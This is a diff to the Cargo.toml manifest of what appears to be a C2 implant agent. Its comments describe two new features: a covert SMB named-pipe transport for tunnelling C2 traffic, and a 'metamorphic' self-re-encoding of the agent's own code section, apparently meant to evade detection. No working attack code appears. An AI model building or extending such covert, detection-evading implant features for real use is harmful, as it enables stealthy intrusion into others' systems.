@@ -31,6 +31,8 @@ serde_json = "1.0"
 serde = { workspace = true }
 module_loader = { path = "../module_loader" }
 optimizer = { path = "../optimizer" }
+code_transform = { path = "../code_transform", optional = true }
+goblin = { version = "0.7", default-features = false, features = ["elf64", "elf32", "endian_fd"], optional = true }
 toml = "1.1.2"
 directories = "6.0.0"
 # rustls 0.23 is used by the agent's direct TLS (outbound, SSH transport, etc.)
@@ -48,6 +50,7 @@ libc = "0.2.185"
 once_cell = "1.21.4"
 zeroize = { version = "1.8.2", features = ["zeroize_derive"] }
 chacha20poly1305 = "0.10"
+aes-gcm = "0.10"
 aes = "0.9.0"
 ctr = "0.10.0"
 async-trait = "0.1.89"
@@ -142,6 +145,18 @@ http-transport = []
 # dependency set; requires no native OpenSSL library — all crypto is
 # pure-Rust.
 ssh-transport = ["dep:russh", "dep:russh-keys"]
+# Activate the SMB/TCP named-pipe covert transport (c2_smb::SmbPipeTransport).
+# When enabled and smb_pipe_enabled=true is set in agent.toml, the agent
+# tunnels C2 traffic through a Windows named pipe.  Two modes are supported:
+# "smb" (direct named-pipe connection via NT syscalls, Windows-only) and
+# "tcp_relay" (connects to a local TCP relay that bridges to the pipe).
+# The server-side SMB relay is provided by orchestra-server
+# (see smb_relay module).
+smb-pipe-transport = []
+# Self-re-encoding ("Metamorphic Lite"): periodically re-encode the agent's own
+# .text section at runtime using the code_transform pipeline with a fresh seed
+# derived from a C2-supplied nonce and the current timestamp.
+self-reencode = ["dep:code_transform", "dep:goblin"]
 
 [[bin]]
 name = "agent-standalone"
